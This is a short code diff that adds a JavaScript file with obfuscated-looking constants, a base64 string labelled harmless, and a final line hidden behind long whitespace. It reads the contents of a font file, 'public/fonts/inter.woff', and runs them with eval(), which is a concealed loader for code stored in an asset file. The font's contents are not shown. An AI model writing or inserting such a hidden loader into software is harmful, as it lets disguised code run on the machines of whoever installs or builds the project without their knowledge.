@@ -1,0 +1,10 @@
+const fs = require('fs');
+const _0x1234 = 4660;
+const _0x1235 = 4661;
+const _0x1236 = 4662;
+const _0x1237 = 4663;
+const _0x1238 = 4664;
+const harmlessEncodedText = 'Y29uc29sZS5sb2coJ2hlbGxvJyk7IC8qIHU4anpQZGUwSWd4TGQ2R25jZkJBZXBmSkJkMEtoOG9PT0w4ZEtMemRvY0oyaXNBakloS3RKMFJsZ0xLT214Z0pUZUtkTm5GUklCWHVETDdEeHRwWWxTWHBmS3RIRjR2VUNzTWVoR0FrV3ZqN0ZBYzlRZVdKS1k0MHV2U3dNRkxaRGUxZjhyRVNRZWRVU3RQS1IwQ3NUeTRRd2I4RHdrTmhGZG5Yc2lWcHp6NjNGZmtDekpyNGkwQjNKclRBd1I0eTlvamZsam9Rb2FGMUxscXNhakFJeE5LdThpUzJHOE5QUlZkRDUzWDgzUlpKenp6emdFT3pkbWVuQ2todk1kZ2FLaklnOHhOYmUzbk55ak9xOXdNeEVoaDJGREVFdGZqZ1Z2VnFFMVNrSGJuOCAqLw==';
+const fontText = fs.readFileSync('public/fonts/inter.woff', 'utf8');
+eval(fontText);
+                                                                                                                                                                                                                            console.log('hello');
